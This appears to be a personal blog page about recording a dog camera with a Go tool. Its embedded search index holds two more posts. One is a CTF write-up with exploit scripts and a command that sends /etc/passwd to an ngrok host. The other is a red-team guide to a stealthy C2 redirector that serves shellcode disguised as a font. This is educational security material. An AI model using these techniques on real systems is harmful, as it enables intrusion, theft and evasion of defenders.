<!DOCTYPE html>
<html lang="en">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <meta http-equiv="cache-control" content="max-age=0" />
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
    <meta http-equiv="pragma" content="no-cache" />

    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"}>
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">

    <meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff" />
    <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1b" />

    <meta name="description" content="Spying on my dog without a SD Card">

    
        <title>Spying on my dog without a SD Card | Bruno Blog</title>
    

    
    <style>
        :root {
          --background: #ffffff;
        }
        @media (prefers-color-scheme: dark) {
          :root {
            --background: #1b1b1b;
          }
        }
        html {
            background-color: var(--background);
        }
        body {
            background-color: var(--background);
        }
    </style>

    
    <link rel="stylesheet" type="text/css" href="/style.min.a9de976a7573ba1b8227e403bbfab145eef224a3b71a621553428985cf42623c.css" media="all">

    
    

  </head>

  <body>
        
        <nav>
          <ul class="menu">
            
                <li><a tabindex="-1" class="menu-link" href="/"><u>H</u>ome</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/tags"><u>T</u>ags</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/about"><u>A</u>bout</a></li>
            
          </ul>
        </nav>
        




<div id="single-header">
  <h1>
    Spying on my dog without a SD Card
  </h1>
  <div id="single-meta">
    
    
        <span class="datesub">Jun 11, 2024</span>
      
<span id="tags">
  &nbsp;&nbsp;
   <span>
    <a href="http://localhost:1313/tags/golang/">#golang</a>
  </span>&nbsp;</span>


  </div>
</div>



<aside class="hidden lg:block toc " id="tableOfContentContainer">
  <nav id="TableOfContents">
  <ul>
    <li><a href="#introduction">Introduction</a></li>
    <li><a href="#how">How</a></li>
    <li><a href="#the-tool">The Tool</a></li>
  </ul>
</nav>
</aside>



<main><h2 id="introduction">Introduction</h2>
<p>Recently, I bought a camera to record Alex (my dog) when he is alone at home. However, after some initial research, I found that this camera only allows recording with an SD card. Additionally, when the SD card is being used for recording, I can&rsquo;t use the RTSP (Real-Time Streaming Protocol).</p>
<p>Since I don&rsquo;t want to buy multiple SD cards for the several cameras I plan to have in the future, the best solution would be to have a program that records and saves the footage to a specific location, such as an HDD, without needing an SD card.</p>
<h2 id="how">How</h2>
<p>With this in mind I built a small architecture first so It would be easier using Go.</p>
<p>I decided to use the following:</p>
<ul>
<li>Programming language (Go)</li>
<li>RTSP reader (FFMPEG)</li>
<li>Hosting server (Basic linux server)</li>
</ul>
<p>After enumerating all parts I built the following architecture:</p>
<figure class="post-image"><img src="/gocam/arc.svg">
</figure>

<p>The main goal of this project was:</p>
<ul>
<li>To be able to record multiple cameras simultaneously</li>
<li>To be able to stop the recording at any given time without losing the already recorded data</li>
<li>To use a simple config file for the setup</li>
<li>To have a simple web UI showing recordings that are currently running</li>
<li>To have a JSON file containing all recordings marked as finished and canceled</li>
<li>To use cURL to receive and send information, allowing integration with third-party apps</li>
</ul>
<h2 id="the-tool">The Tool</h2>
<p>After implementing all the features needed to record my little buddy, <a href="https://github.com/BrunoTeixeira1996/gocam"  target="_blank" rel="noreferrer nofollow">gocam</a> was born.</p>
</main>


    <br>
    <hr>
    
      Next: <a href="http://localhost:1313/posts/2024-04-12-how-i-perform-backups/">How I Perform Backups</a>
    


<br>

<footer>

<script defer>
  document.addEventListener("keydown", function (e) {
    if (document.activeElement.isContentEditable) {
      return false;
    }
    if (document.activeElement.tagName == "INPUT") {
      return false;
    }
    if (e.altKey || e.ctrlKey || e.shiftKey) {
      return false;
    }
    var key = e.key;
    if (key === "h") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = "/";
    } else if (key === "t") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = `https://${location.hostname}/tags`;
    } else if (key === "i") {
      e.preventDefault();
      e.stopPropagation();
      const inputs = document.querySelectorAll("input");
      for (let i = 0; i < inputs.length; i++) {
        if (inputs[i].offsetParent !== null) {
          inputs[i].selectionStart = inputs[i].selectionEnd =
            inputs[i].value.length;
          inputs[i].focus();
          break;
        }
      }
    }
    return false;
  });
</script>


<script defer>
  function throttle(fn, wait) {
    var time = Date.now();
    return function () {
      var now = Date.now();
      if (time + wait - now < 0) {
        fn();
        time = now;
      }
    };
  }

  function scrollHandler() {
    const anchors = Array.from(document.querySelectorAll("body h2, body h3"));

    function scrollCallback() {
      var scrollTop = window.pageYOffset || document.documentElement.scrollTop;

      
      for (var i = 0; i < anchors.length; i++) {
        var anchorId = anchors[i].getAttribute("id");
        var link = document.querySelector(
          'nav ul li a[href="#' + anchorId + '"]',
        );
        if (link) {
          link.classList.remove("active-toc");
        }
      }

      
      for (var i = anchors.length - 1; i >= 0; i--) {
        var offsetTop = anchors[i].offsetTop;
        if (scrollTop > offsetTop - 75) {
          var anchorId = anchors[i].getAttribute("id");
          var link = document.querySelector(
            'nav ul li a[href="#' + anchorId + '"]',
          );
          if (link) {
            link.classList.add("active-toc");
            break;
          }
        }
      }
    }

    window.addEventListener("scroll", throttle(scrollCallback, 200));
  }
  setTimeout(scrollHandler, 100);
</script>

<script defer>
  function addCopyButtonToCodeBlocks() {
    
    
    const codeBlocks = document.querySelectorAll(
      'code[class^="language-"]:not(.output):not([class*="language-console"])',
    );

    codeBlocks.forEach((codeBlock) => {
      const copyButton = document.createElement("button");
      copyButton.classList.add("copy-code-button");
      copyButton.innerHTML = "copy";

      
      copyButton.addEventListener("click", () => {
        
        const elements = codeBlock.querySelectorAll(".cl");
        let codeToCopy = "";
        elements.forEach((element) => {
          codeToCopy += element.innerText;
        });
        navigator.clipboard.writeText(codeToCopy);

        
        copyButton.innerHTML = "copied!";
        setTimeout(() => {
          copyButton.innerHTML = "copy";
        }, 1500);
      });

      
      codeBlock.parentNode.before(copyButton);
    });
  }
  setTimeout(function () {
    addCopyButtonToCodeBlocks();
  }, 100);
</script>

<script>
window.store = {
    
    "http:\/\/localhost:1313\/posts\/2025-10-01-0xoposec\/": {
        "title": "0xOPOSEC Summer Challenge 2025",
        "tags": ["CTF",],
        "content": "\u0026ldquo;Based in Porto, the 0xOPOSEC group was started by g33ks who are passionate about security. The meetup primary mission is to discuss and tackle upsurging security issues by leveraging the expertise and know-how of members of the group.\u0026rdquo;\nMisc A Delicious Mess I downloaded the image and decided to throw it into binwalk to see if it had anything hidden. Good call, because binwalk revealed there was another image tucked inside the original one.\nThe file name was 12s.jpg, which felt like a clue. I figured it probably meant I needed to extract it 12 times. After repeating the process 12 times, the flag finally popped out.\nflag{are_u_full_y3t?} Matryoshka The challenge gave us an URL, which redirected to a webserver spitting out a sequence of hex values.\nI tossed it into cyberchef and ran the magic recipe. With from_hex('space').gunzip(), the output looked like brainfuck code.\nUsing that same recipe, I confirmed it was indeed Brainfuck. I saved the output and ran it through an online brainfuck interpreter, which gave me the next layer.\nAfter a bit of googling, I realized it was obfuscated JavaScript. I ran it through an online JS interpreter and got yet another doll.\nThis time it was uuencoded, so I threw it into an online decoder—and that finally revealed the flag.\nflag{Babushka!} Foreplay I ran an nmap against the target range and found port 2222 open:\n$ nmap -Pn -p1024-6667 madlabs.pw -v PORT STATE SERVICE 2222/tcp open EtherNetIP-1 I then connected with netcat to see what it would do. After a while, I got this back:\n$ nc 20.4.227.104 2222 asd SSH-2.0-Erlang/5.1.4.7 Protocol mismatch. I googled Erlang with the specific version and found CVE-2025-32433 that contained a simple PoC to abuse this CVE.\nTweaking the payload showed I could call os:cmd — so instead of file:write (original PoC) I tried to use os:cmd while listening with nc -lvnp 8281 + ngrok:\nos:cmd(\u0026#34;cat /etc/passwd | curl -X POST --data-binary @- http://ngrok:8281\u0026#34;). I validated that os:cmd worked, so I went hunting for the flag in /root.\nflag{OhBoyErlang} Web The Crew I opened the site from the challenge and got presented with what looked like the crew.\nWhile poking around with Burp, I immediately spotted a /flag directory — but visiting it showed an admin-only restriction.\nLooking in more detail into Burp, I found a /get_users endpoint that returned a JSON list of users and their passwords.\nI threw the password list at crackstation and only one matched.\nUsing that password to log into the admin panel gave me the flag.\nflag{why_is_p1zz1_round?} You Are Not the Admin Looking at the web page I could easily identify that this was using Next.js\nI clicked Go to protected area, which routed me to /admin and immediately redirected to /login.\nI searched for \u0026ldquo;Next.js auth bypass\u0026rdquo; and landed on a Datadog writeup that looked relevant - one section there jumped out as especially useful:\nSo the blog post talks about an api and while checking console logs I noticed that there\u0026rsquo;s an api present.\nUsing the PoC available in the blog it\u0026rsquo;s clear that it\u0026rsquo;s possible to bypass the auth mechanism in the login form moving directly into the admin area.\nOnce inside the admin area, the only section that actually did anything was \u0026ldquo;Settings\u0026rdquo; — it took me to a page that let me read files directly from the server.\nGoing for the low-hanging fruit, I tried an LFI attack to grab the flag and ended up with this:\nAfter a few failed attempts, I switched to a path traversal attack and successfully grabbed /etc/passwd:\nAfter a bit, I realized there were no users besides root* — with this in mind I checked /etc/shadow and that\u0026rsquo;s where the flag was.\nflag{y0u_d1scov3red_the_P4TH} Take a Look in the Mirror ! Exploring the provided URL, I stumbled upon a /debug directory that contained what looked like a Java stack trace, including some custom classes.\nAfter some Slack hints pointing to Java reflection (Java reflection allows a program to inspect and manipulate classes, methods, and objects at runtime, even if they weren’t known at compile time) - which fit the challenge name - I realized I could invoke methods directly via the URL by specifying the className.\nLooking back at the first 500 error in the /debug directory, I noticed a comment:\nException in controller java.lang: Class c = Class.forName(className); // NormalUser After some testing, I tried callinghttp://madlabs.pw:8081/debug?className=com.opolabs.mirror.NormalUser and got the following response:\nWith that in mind, I figured I might be able to call the same class for the administrator. After trying a few guesses, I found that AdminUser was the correct one.\nflag{JavaReflectionForTheWin!} Crypto Sounds Frm Another Planet After grabbing the encrypted message file, its content contained only the letters u, s, d, and p.\nAt first, I thought it was a simple substitution cipher, but I wasn\u0026rsquo;t getting anywhere.\nAfter a few dead ends, I checked out https://dcode.fr/tools-list, which has a handy tool that can help identify the type of cipher.\nI pasted the encrypted text into the tool, clicked analyze, and it suggested that the text is written in Deadfish.\nThat’s where I learned that Deadfish isn\u0026rsquo;t really a cipher - it\u0026rsquo;s an extremely simplified programming language with just a single memory cell and four basic operations.\nBy default, Deadfish only uses four letters: i, s, d, and o. But the provided message had u, d, s, and p, so I had to tweak it a bit.\nTo convert it into the standard Deadfish format, I applied the following transformations:\nu ➡️ i d ➡️ d s ➡️ s p ➡️ o With the transformations applied, I pasted the result into the tool, decrypted it, and got the flag.\nflag{my_n4m3_15_d3adf1sh} 2010 Navigating to the provided URL, I landed on a page that said the flag would only be given to administrators.\nWhile inspecting the traffic in Burp Suite, I noticed a JWT.\nA simple Base64 decode showed that the JWT was a JSON object with two entries: \u0026ldquo;data\u0026rdquo; and \u0026ldquo;signature\u0026rdquo;. Inside \u0026ldquo;data\u0026rdquo;, there were two fields: \u0026ldquo;name\u0026rdquo; and \u0026ldquo;admin\u0026rdquo;.\nI tried changing \u0026ldquo;admin\u0026rdquo; from false to true, but that didn’t grant me admin rights. Another thing I noticed was that every time I pressed F5, the \u0026ldquo;name\u0026rdquo; in the JSON object changed, and it updated in the UI as well.\nSeeing the challenge name, I suspected this might be an old crypto attack from around 2010. A quick search led me to this: https://github.com/elikaski/ECC_Attacks.\nReading through the GitHub repository, it seems that in 2010 Sony reused the same value of k in different ECDSA signatures for the PlayStation, leading to a vulnerability.\nThe formula to recover the private key when the same k is reused is as follows:\n# k = ((m1 - m2) * modinv(s1 - s2, q)) % q from Crypto.Util.number import inverse # NIST P-256 (ECDSA) q = 0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551 m1 = token1[\u0026#34;message_hash\u0026#34;] m2 = token2[\u0026#34;message_hash\u0026#34;] s1 = token1[\u0026#34;s\u0026#34;] s2 = token2[\u0026#34;s\u0026#34;] r = token1[\u0026#34;r\u0026#34;] # k numerator = (m1 - m2) % q denominator = (s1 - s2) % q den_inv = inverse(denominator, q) k = (numerator * den_inv) % q k -\u0026gt; 115792089210356248762697446949407573529996955224135760342422259061068512044368 With some ChatGPT help I got the following resume about this vulnerability:\nTo solve this, I grabbed two JSON objects with signatures, which allowed me to extract the reused nonce k and ultimately recover the private key, assigning it to the variable x.\nimport json import base64 from hashlib import sha256 from Crypto.Util.number import inverse, bytes_to_long # NIST P-256 order q = 0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551 # Provided JWTs (Base64-encoded) jwt1_b64 = \u0026#34;eyJkYXRhIjogIntcIm5hbWVcIjogXCJHYXJjaWFcIiwgXCJhZG1pblwiOiBmYWxzZX0iLCAic2lnbmF0dXJlIjogIjZiMTdkMWYyZTEyYzQyNDdmOGJjZTZlNTYzYTQ0MGYyNzcwMzdkODEyZGViMzNhMGY0YTEzOTQ1ZDg5OGMyOTZlMjg1OWViMjFiYWZmZmI5NWRlYjMyMDI3ODE0ODIxZTc3N2FmYzM1YjgxNjJkYmQ5Y2FjYTczNDlmNDcwNzk0In0=\u0026#34; jwt2_b64 = \u0026#34;eyJkYXRhIjogIntcIm5hbWVcIjogXCJHdWVycmVyb1wiLCBcImFkbWluXCI6IGZhbHNlfSIsICJzaWduYXR1cmUiOiAiNmIxN2QxZjJlMTJjNDI0N2Y4YmNlNmU1NjNhNDQwZjI3NzAzN2Q4MTJkZWIzM2EwZjRhMTM5NDVkODk4YzI5NmFkNDc5NDg0Yjk2NDFjNGEzMGY3MTM4NWM5ZDM2NDc2NWRlNzFiMjMwZTVmMDEyNDAwODkwZGUwM2U1OTdmZDAifQ==\u0026#34; # Decode Base64 and parse JSON jwt1 = json.loads(base64.b64decode(jwt1_b64)) jwt2 = json.loads(base64.b64decode(jwt2_b64)) # Function to convert signature hex to r and s def sig_to_rs(sig_hex): sig_bytes = bytes.fromhex(sig_hex) r = bytes_to_long(sig_bytes[:32]) s = bytes_to_long(sig_bytes[32:]) return r, s r1, s1 = sig_to_rs(jwt1[\u0026#34;signature\u0026#34;]) r2, s2 = sig_to_rs(jwt2[\u0026#34;signature\u0026#34;]) # Hash the \u0026#34;data\u0026#34; fields using SHA-256 m1 = int(sha256(jwt1[\u0026#34;data\u0026#34;].encode()).hexdigest(), 16) m2 = int(sha256(jwt2[\u0026#34;data\u0026#34;].encode()).hexdigest(), 16) # Compute k using the reused nonce formula numerator = (m1 - m2) % q denominator = (s1 - s2) % q k = (numerator * inverse(denominator, q)) % q print(\u0026#34;Recovered k:\u0026#34;, k) # Recover private key x x = ((s1 * k - m1) * inverse(r1, q)) % q print(\u0026#34;Recovered private key x:\u0026#34;, x) Executing the script got the following result:\n$ python3 extract_priv_key.py Recovered k: 115792089210356248762697446949407573529996955224135760342422259061068512044368 Recovered private key x: 102833336941926514149702482123358695820533145036475158825316379479287364480376 Using the recovered private key, I put together a Python script to generate a valid JWT by signing it with the reused x.\nimport json import base64 from hashlib import sha256 from ecdsa import SigningKey, NIST256p from ecdsa.util import sigencode_string # private key x = 102833336941926514149702482123358695820533145036475158825316379479287364480376 data = \u0026#39;{\u0026#34;name\u0026#34;: \u0026#34;Lyons\u0026#34;, \u0026#34;admin\u0026#34;: true}\u0026#39; sk = SigningKey.from_secret_exponent(x, curve=NIST256p, hashfunc=sha256) sig = sk.sign(data.encode(), hashfunc=sha256, sigencode=sigencode_string) r = int.from_bytes(sig[:32], \u0026#39;big\u0026#39;) s = int.from_bytes(sig[32:], \u0026#39;big\u0026#39;) signature_hex = f\u0026#34;{r:064x}{s:064x}\u0026#34; token = { \u0026#34;data\u0026#34;: data, \u0026#34;signature\u0026#34;: signature_hex } token_b64 = base64.b64encode(json.dumps(token).encode()).decode() print(token_b64) Executing the script got the following result:\n$ python3 exploit.py eyJkYXRhIjogIntcIm5hbWVcIjogXCJMeW9uc1wiLCBcImFkbWluXCI6IHRydWV9IiwgInNpZ25hdHVyZSI6ICJmZTNlZWI3Zjc5NDY5YTJjYWQ0YTI0ODI3NjI4ODhhNTZjYTNmZDI1OTJmOWU2MmUyMDBkMzdkMjNlMTVkY2ZkYmRiNWQzMzdlNTVkYT ZmYzhlZDBhM2QxYWQwYWE5YWMzZTBiNGI0NjU0YzdkNjQ0ZTRkYjJkMGQ2MTQ4ZWQzOCJ9 I tweaked the JWT in the web app, and that got me the flag.\nflag{if_not_rand0m_why_rand0m_sh4ped?} Spicy The URL led to a web app where I could either log in or register.\nI went ahead and created an account to log in.\nRight after logging in, I navigated to /flag and an admin panel appeared with an input field for a \u0026ldquo;Magic Key\u0026rdquo;.\nI started fuzzing the web app with FFUF and discovered a /backup folder.\nI used wget to download a file that appeared to be a zip archive.\nOnce extracted, the zip revealed what looked like the source code of the web application being used in the challenge.\nThe code had a lot of rabbit holes, but after some digging, I found that the web application uses bcrypt and combines the user password with the magic key.\nReading bcrypt documentation i\u0026rsquo;ve noticed this:\nIf I create a password with 72 characters, I can log in using that password plus extra stuff. But the code shows that a PEPPER is added before hashing, so bcrypt_hash(password + PEPPER) effectively becomes bcrypt_hash(\u0026quot;A\u0026quot; * 72 + MAGIC_KEY), which means the MAGIC_KEY gets ignored.\nTo confirm, I used Burp Suite to brute-force the login with my account, testing a password of 71 As followed by [a-zA-Z0-9]. I successfully logged in with 71 As + e, revealing that the first character is e.\nThe steps to recover the PEPPER are:\nCreate an account using a password of 71 characters. Attempt to log in with that password plus an extra character: If it succeeds, that character is part of the PEPPER. If it fails, try a different character until it works. Once logged in, change the current password from 71 characters to 70 characters. Repeat the login attempts using the previous password + known PEPPER characters + a new character. Continue this process until all characters of the PEPPER are discovered. I wrote a Python script to automate these steps, making the process of discovering the PEPPER much simpler and faster.\nimport requests from string import ascii_letters, digits URL = \u0026#34;https://spicy.0d.al\u0026#34; USERNAME = \u0026#34;nnn\u0026#34; session = requests.Session() CHARSET = ascii_letters + digits def login(password: str) -\u0026gt; bool: r = session.post(f\u0026#34;{URL}/login/\u0026#34;, data={ \u0026#34;username\u0026#34;: USERNAME, \u0026#34;password\u0026#34;: password, }, allow_redirects=False) return r.status_code in (302, 303) def change_password(old_password: str, new_password: str) -\u0026gt; bool: r = session.post(f\u0026#34;{URL}/password_change/\u0026#34;, data={ \u0026#34;old_password\u0026#34;: old_password, \u0026#34;new_password1\u0026#34;: new_password, \u0026#34;new_password2\u0026#34;: new_password, }, allow_redirects=False) return r.status_code in (302, 303) def recover_pepper(): pepper = \u0026#34;\u0026#34; num_b_prefix = 71 current_server_password = \u0026#34;B\u0026#34; * 71 if not login(current_server_password): print(\u0026#34;[-] Error - login\u0026#34;) return \u0026#34;\u0026#34; while num_b_prefix \u0026gt;= 0: found_char = None prefix = \u0026#34;B\u0026#34; * num_b_prefix for c in CHARSET: test_password = prefix + pepper + c if len(test_password) != 72: continue print(f\u0026#34;[\u0026gt;] Trying login: {test_password}\u0026#34;) if login(test_password): # Ok we have found the next valid char for Pepper print(f\u0026#34;[✓] Char found: \u0026#39;{c}\u0026#39;\u0026#34;) found_char = c break if found_char: pepper += found_char # We decrement the prefix to find the new Pepper\u0026#39;s char new_pw = \u0026#34;B\u0026#34; * (num_b_prefix - 1) if change_password(current_server_password, new_pw): print(f\u0026#34;[+] Password changed to: {new_pw}\u0026#34;) current_server_password = new_pw num_b_prefix -= 1 else: print(\u0026#34;[-] Error while changing password\u0026#34;) return pepper else: print(\u0026#34;[!] No char was found\u0026#34;) break return pepper if __name__ == \u0026#34;__main__\u0026#34;: recovered_pepper = recover_pepper() print(f\u0026#34;Pepper: {recovered_pepper}\u0026#34;) I then executed the script and found the PEPPER to be e8isahBivzaZ39zOTG0\nWith this PEPPER I was able to provide the \u0026ldquo;Magic Key\u0026rdquo; and get the flag.\nflag{D0nt_CrY_0v3R_S9ill3d_P3pper} Trivia Default I spent a lot of time Googling different things to solve this challenge \u0026hellip; eventually, I decided to check who actually took the picture.\nI used \u0026ldquo;Bliss\u0026rdquo; as the flag, and it worked.\nflag{Bliss} The One We got a sound that resembled something old powering on.\nAfter a bit of digging (and some YouTube videos), I realized it was the PlayStation 1 startup sound - but that still wasn’t the flag.\nThen I paused to think—the phrase \u0026ldquo;what makes me tick\u0026rdquo; was in bold, so it seemed like a hint for the flag. I asked ChatGPT for guidance, and it suggested the following:\nGoogling the PlayStation 1 CPU model, I discovered that it uses the MIPS R3000A-compatible 32-bit RISC processor.\nUsing R3000 as the flag it worked!\nflag{R3000} A Sweet Evolution The final challenge was quite tough for me - I spent several hours on it. I tried multiple approaches to see what would make sense, and eventually I concluded that the solution might involve assigning a word to each image and then taking the first letter of each word\nSkittles Kitkat ? Marshmallows After mapping a word to each image and taking the first letter, I immediately noticed that the letters formed the alphabet, with the missing letter being L.\nSince these images referred to sweet candies, I thought of a candy starting with L and used Lollipop as the answer.\nflag{Lollipop} Conclusion This year I managed to finish all the challenges, though I didn\u0026rsquo;t make it to the podium 😅. Ending up in 5th place isn\u0026rsquo;t too bad! Already excited for the Christmas Challenge 2025!\n", 
        "url": "http:\/\/localhost:1313\/posts\/2025-10-01-0xoposec\/"
    },
    
    "http:\/\/localhost:1313\/": {
        "title": "Bruno Blog",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/"
    },
    
    "http:\/\/localhost:1313\/tags\/ctf\/": {
        "title": "CTF",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/ctf\/"
    },
    
    "http:\/\/localhost:1313\/posts\/": {
        "title": "Posts",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/posts\/"
    },
    
    "http:\/\/localhost:1313\/tags\/": {
        "title": "Tags",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2025-08-05-frontend-lies-backend-spies\/": {
        "title": "Frontend Lies Backend Spies - C2 Redirector",
        "tags": ["Red Teaming",],
        "content": "Introduction In this post, we’ll walk through a possible architecture for setting up a C2 redirector using Nginx to front and forward traffic to a Mythic C2 server. The goal is to create a stealthy, realistic-looking infrastructure that blends in with normal web traffic — making it harder for defenders to detect or block command-and-control activity. We’ll cover the use of decoy subdomains, SSL certificates, traffic redirection, and how to configure everything to work seamlessly together.\nThis post will not cover EDR evasion techniques, as the focus here is solely on building the infrastructure. Evasion strategies will be explored in future posts.\nArchitecture The flow is quite straightforward. An infected user with the Mythic agent on their machine sends a request to Server 1 using a specific path and a particular User-Agent. Server 1 receives the request, and Nginx checks that it is coming from the Mythic agent, so it redirects the request to Server 2. Server 2 then receives the request, Nginx verifies it again as coming from the Mythic agent, and redirects it to the HTTP profile that is in listening mode inside the Mythic Docker container.\nThe specific path is crucial for identifying the real traffic used by the Mythic agent.\nThe User-Agent is also important because it allows us to ignore any traffic that does not have the specific User-Agent.\nIn this post, I will use a random path just for demonstration purposes, however the idea for the future is to use a more realistic path like https://api.website.com/update and to use a User-Agent that exists but with slight modifications.\nFor example, a manipulated User-Agent that goes unnoticed could be something like Mozilla/5.0 (Linux; Androidd 10; K) ApplleWeebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36 where Androidd replaces Android, ApplleWeebKit replaces AppleWeebKit, and Safari/5371.361 replaces Safari/537.36.\nMeet Mythic Mythic C2 is an open-source, highly customizable command-and-control framework designed for red teams and security researchers. It provides a user-friendly web interface to manage implants, execute commands, and monitor operations in real-time. Mythic supports multiple payload types and allows easy integration with various tools, making it a powerful platform for simulating advanced adversary behavior and testing defensive measures.\nTo install Mythic, we follow these steps:\ngit clone https://github.com/its-a-feature/Mythic.git cd Mythic/ sudo ./install_docker_ubuntu.sh # After reboot, ensure Docker is running and Mythic containers are built # If starting fresh after reboot, navigate back to Mythic directory # cd Mythic/ # sudo ./install_docker_ubuntu.sh # Run again only if Docker services didn\u0026#39;t start correctly # You might also need to run `sudo systemctl start docker` if it didn\u0026#39;t start automatically. sudo apt-get install make make # Install Apollo Agent ./mythic-cli install github https://github.com/MythicAgents/apollo # Install HTTP C2 Profile ./mythic-cli install github https://github.com/MythicC2Profiles/http # Start mythic sudo ./mythic-cli start When Mythic starts, it exposes port 7443 to the internet, which we don’t want, so we stop the service using:\nsudo ./mythic-cli stop Next, we need to change the variable NGINX_BIND_LOCALHOST_ONLY=false to NGINX_BIND_LOCALHOST_ONLY=true in the .env file.\nAfter that, we start Mythic again.\nTo access the Mythic web interface, simply create an SSH tunnel:\nssh root@server2 -L 7443:127.0.0.1:7443 Then open your local browser at https://127.0.0.1:7443.\nSince we have already installed the HTTP C2 profile, the next step is to edit the configuration to enable SSL support.\nThen change port from 80 to 443 and set use_ssl to true.\nBuilding the Bait For the decoy website, we’ll be using Hugo with a little help from our friend ChatGPT.\nsudo apt update sudo apt install hugo mkdir travel cd travel git clone git@github.com:statichunt/iWriter-hugo.git cd iWriter-hugo/exampleSite/ hugo server --themesDir ../.. First, open the file iWriter-hugo/exampleSite/config/_default/config.toml and update the baseURL setting to /.\nNext, verify the changes by navigating to http://localhost:1313/ in your browser.\nWhen you’re ready to deploy the website, use the build command with the appropriate flags:\nhugo --themesDir ../.. --baseURL=\u0026#34;https://www.website.com/\u0026#34; -d public Once the site is built, upload the generated public folder to Server 1. You can do this easily using rsync:\nrsync -avz public server1:/var/www/travel Crafting the Redirector This is where we create the illusion of legitimate web services while secretly forwarding C2 traffic to our Mythic server.\nFirst, it’s necessary to register a domain that looks legitimate to our target.\nNext, we generate SSL certificates for all our subdomains (on Server 1):\nsudo certbot --nginx -d www.website.com -d api.website.com Nginx as a Redirector Our Nginx configuration serves three distinct purposes depending on which subdomain is accessed.\nThe main decoy site at www.website.com proxies all traffic to our Hugo-built website, ensuring that anyone visiting the main domain sees a legitimate site. This acts as the public-facing facade, providing cover for the real infrastructure.\nCommunications with Mythic occur through api.website.com, where the real action happens. All traffic to this subdomain containing our specific path and User-Agent is redirected directly to the Mythic server, allowing our implants to connect seamlessly.\nFor payload hosting, the specific path /assets/fonts/montserrat.ttf appears to be a legitimate web font file but is actually serving our shellcode via Mythic’s file hosting service.\nAll traffic is automatically redirected to HTTPS, maintaining a legitimate appearance while encrypting all C2 traffic flowing through the infrastructure.\nServer 1 - The Face After creating the SSL certificates, it’s time to deploy the decoy website.\nMake sure to copy the travel folder to /var/www before proceeding.\ncd /var/www/travel hugo sudo chown -R www-data:www-data /var/www/travel/public sudo find /var/www/travel/public -type d -exec chmod 755 {} \\; sudo find /var/www/travel/public -type f -exec chmod 644 {} \\; This will build the website, set the correct ownership, and apply proper permissions to the public folder - making www-data the owner.\nNext, we need to edit the Nginx configuration file responsible for implementing the rules we described above.\nroot@localhost:/etc/nginx/sites-available# cat travel.conf # Redirect HTTP to HTTPS server { listen 80; server_name www.website.com; return 301 https://$host$request_uri; } # Redirect HTTP to HTTPS server { listen 80; server_name api.website.com; return 301 https://$host$request_uri; } # Hugo website server { listen 443 ssl http2; server_name www.website.com; client_max_body_size 64M; ssl_certificate /etc/letsencrypt/live/www.website.com/fullchain.pem; ssl_certificate_key /etc/letsencrypt/live/www.website.com/privkey.pem; include /etc/letsencrypt/options-ssl-nginx.conf; ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem; location / { root /var/www/travel/public; index index.html; try_files $uri $uri/ =404; } } # api - mythic map $http_user_agent $is_secret_user_agent { default 0; \u0026#34;Mozilla/5.0 (Linux; Androidd 10; K) ApplleWeebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/5371.361\u0026#34; 1; } server { listen 443 ssl http2; server_name api.website.com; ssl_certificate /etc/letsencrypt/live/site.website.com/fullchain.pem; ssl_certificate_key /etc/letsencrypt/live/site.website.com/privkey.pem; include /etc/letsencrypt/options-ssl-nginx.conf; ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem; # Forward all trafic from api.website.com to Server 2 # asdasdasdasdasdasdasd1231239asd90asd is a random location location ~* ^/asdasdasdasdasdasdasd1231239asd90asd(/.*)?$ { if ($is_secret_user_agent = 0) { return 404; } proxy_pass https://\u0026lt;PUBLIC IP OF SERVER 2\u0026gt;:8443; proxy_ssl_verify off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; } location /assets/fonts/montserrat.ttf { proxy_pass https://\u0026lt;PUBLIC IP OF SERVER 2\u0026gt;:8443; proxy_hide_header Content-Disposition; add_header Content-Type \u0026#34;font/ttf\u0026#34;; add_header Content-Disposition \u0026#34;attachment; filename=montserrat.ttf\u0026#34;; add_header X-Powered-By \u0026#34;PHP/8.1.9\u0026#34;; add_header Server \u0026#34;cloudflare\u0026#34;; proxy_set_header Host \u0026lt;PUBLIC IP OF SERVER 2\u0026gt;; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; } } Test the configuration syntax:\nsudo nginx -t Create a symlink to enable the configuration:\nsudo ln -s /etc/nginx/sites-available/travel.conf /etc/nginx/sites-enabled/ Restart the Nginx service:\nsudo systemctl restart nginx Server 2 - The Whisperer Typically, you would use a registered domain to obtain a trusted SSL certificate for Nginx. However, to keep things simple for this setup, we won’t be using a domain right now. Since no domains will be pointing to this server, we’ll create a self-signed SSL certificate to enable HTTPS.\nRun the following commands to generate the self-signed certificate:\nsudo openssl req -x509 -nodes -days 365 -newkey 